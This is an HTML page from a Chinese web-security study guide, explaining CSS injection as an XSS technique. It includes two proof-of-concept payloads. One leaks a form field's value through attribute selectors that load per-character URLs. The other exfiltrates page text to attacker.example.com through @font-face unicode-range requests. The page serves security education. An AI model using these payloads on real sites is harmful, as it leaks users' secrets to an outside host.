@@ -1,0 +1,310 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>4.2.9.2. CSS 注入 &mdash; Web安全学习笔记 1.0 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+  <script type="text/javascript" src="../../../_static/js/modernizr.min.js"></script>
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../../" src="../../../_static/documentation_options.js"></script>
+        <script src="../../../_static/jquery.js"></script>
+        <script src="../../../_static/underscore.js"></script>
+        <script src="../../../_static/doctools.js"></script>
+        <script src="../../../_static/language_data.js"></script>
+    
+    <script type="text/javascript" src="../../../_static/js/theme.js"></script>
+
+    
+
+  
+  <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+    <link rel="next" title="4.2.9.3. Bypass Via Script Gadgets" href="gadget.html" />
+    <link rel="prev" title="4.2.9.1. httponly" href="httponly.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../../index.html" class="icon icon-home"> Web安全学习笔记
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">内容索引:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../../basic/index.html">1. 序章</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../network/index.html">2. 计算机网络与协议</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../info/index.html">3. 信息收集</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../../index.html">4. 常见漏洞攻防</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../../sql/index.html">4.1. SQL注入</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="../index.html">4.2. XSS</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="../classify.html">4.2.1. 分类</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../harm.html">4.2.2. 危害</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../sop.html">4.2.3. 同源策略</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../csp.html">4.2.4. CSP</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../source.html">4.2.5. XSS数据源</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../sink.html">4.2.6. Sink</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../mitigation.html">4.2.7. XSS保护</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../wafbypass.html">4.2.8. WAF Bypass</a></li>
+<li class="toctree-l3 current"><a class="reference internal" href="index.html">4.2.9. 技巧</a><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="httponly.html">4.2.9.1. httponly</a></li>
+<li class="toctree-l4 current"><a class="current reference internal" href="#">4.2.9.2. CSS 注入</a></li>
+<li class="toctree-l4"><a class="reference internal" href="gadget.html">4.2.9.3. Bypass Via Script Gadgets</a></li>
+<li class="toctree-l4"><a class="reference internal" href="jsfuck.html">4.2.9.4. jsfuck cheat sheet</a></li>
+<li class="toctree-l4"><a class="reference internal" href="rpo.html">4.2.9.5. RPO(Relative Path Overwrite)</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../payload.html">4.2.10. Payload</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../rootkit.html">4.2.11. 持久化</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../ref.html">4.2.12. 参考链接</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../csrf.html">4.3. CSRF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../ssrf.html">4.4. SSRF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../cmdinjection.html">4.5. 命令注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../pathtraversal.html">4.6. 目录穿越</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../fileread.html">4.7. 文件读取</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../fileupload.html">4.8. 文件上传</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../fileinclude.html">4.9. 文件包含</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../xxe.html">4.10. XXE</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../ssti.html">4.11. 模版注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../xpath.html">4.12. Xpath注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../logic.html">4.13. 逻辑漏洞 / 业务漏洞</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../config.html">4.14. 配置安全</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../middleware/index.html">4.15. 中间件</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../webcache.html">4.16. Web Cache欺骗攻击</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../httpSmuggling.html">4.17. HTTP 请求走私</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../../language/index.html">5. 语言与框架</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../intranet/index.html">6. 内网渗透</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../defense/index.html">7. 防御技术</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../auth/index.html">8. 认证机制</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../tools/index.html">9. 工具与资源</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../manual/index.html">10. 手册速查</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../misc/index.html">11. 其他</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">Web安全学习笔记</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../../index.html"><span class="section-number">4. </span>常见漏洞攻防</a> &raquo;</li>
+        
+          <li><a href="../index.html"><span class="section-number">4.2. </span>XSS</a> &raquo;</li>
+        
+          <li><a href="index.html"><span class="section-number">4.2.9. </span>技巧</a> &raquo;</li>
+        
+      <li><span class="section-number">4.2.9.2. </span>CSS 注入</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../../../_sources/vuln/xss/trick/cssi.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="css">
+<h1><span class="section-number">4.2.9.2. </span>CSS 注入<a class="headerlink" href="#css" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="id1">
+<h2><span class="section-number">4.2.9.2.1. </span>基本介绍<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h2>
+<p>CSS注入最早开始于利用CSS中的 <code class="docutils literal notranslate"><span class="pre">expression()</span></code> <code class="docutils literal notranslate"><span class="pre">url()</span></code> <code class="docutils literal notranslate"><span class="pre">regex()</span></code> 等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。</p>
+</div>
+<div class="section" id="css-selectors">
+<h2><span class="section-number">4.2.9.2.2. </span>CSS selectors<a class="headerlink" href="#css-selectors" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>
+    <span class="c1">#form2 input[value^=&#39;a&#39;] { background-image: url(http://localhost/log.php/a); }</span>
+    <span class="c1">#form2 input[value^=&#39;b&#39;] { background-image: url(http://localhost/log.php/b); }</span>
+    <span class="c1">#form2 input[value^=&#39;c&#39;] { background-image: url(http://localhost/log.php/c); }</span>
+    <span class="p">[</span><span class="o">...</span><span class="p">]</span>
+<span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;http://example.com&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;form2&quot;</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;secret&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;secret&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;abc&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>上图是利用CSS selectors完成攻击的一个示例</p>
+</div>
+<div class="section" id="abusing-unicode-range">
+<h2><span class="section-number">4.2.9.2.3. </span>Abusing Unicode Range<a class="headerlink" href="#abusing-unicode-range" title="Permalink to this headline">¶</a></h2>
+<p>当可以插入CSS的时候，可以使用 <code class="docutils literal notranslate"><span class="pre">font-face</span></code> 配合 <code class="docutils literal notranslate"><span class="pre">unicode-range</span></code> 获取目标网页对应字符集。PoC如下</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;style&gt;
+@font-face{
+ font-family:poc;
+ src: url(http://attacker.example.com/?A); /* fetched */
+ unicode-range:U+0041;
+}
+@font-face{
+ font-family:poc;
+ src: url(http://attacker.example.com/?B); /* fetched too */
+ unicode-range:U+0042;
+}
+@font-face{
+ font-family:poc;
+ src: url(http://attacker.example.com/?C); /* not fetched */
+ unicode-range:U+0043;
+}
+#sensitive-information{
+ font-family:poc;
+}
+&lt;/style&gt;
+&lt;p id=&quot;sensitive-information&quot;&gt;AB&lt;/p&gt;
+</pre></div>
+</div>
+<p>当字符较多时，则可以结合 <code class="docutils literal notranslate"><span class="pre">::first-line</span></code>  等CSS属性缩小范围，以获取更精确的内容</p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="gadget.html" class="btn btn-neutral float-right" title="4.2.9.3. Bypass Via Script Gadgets" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="httponly.html" class="btn btn-neutral float-left" title="4.2.9.1. httponly" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2019, Lyle
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
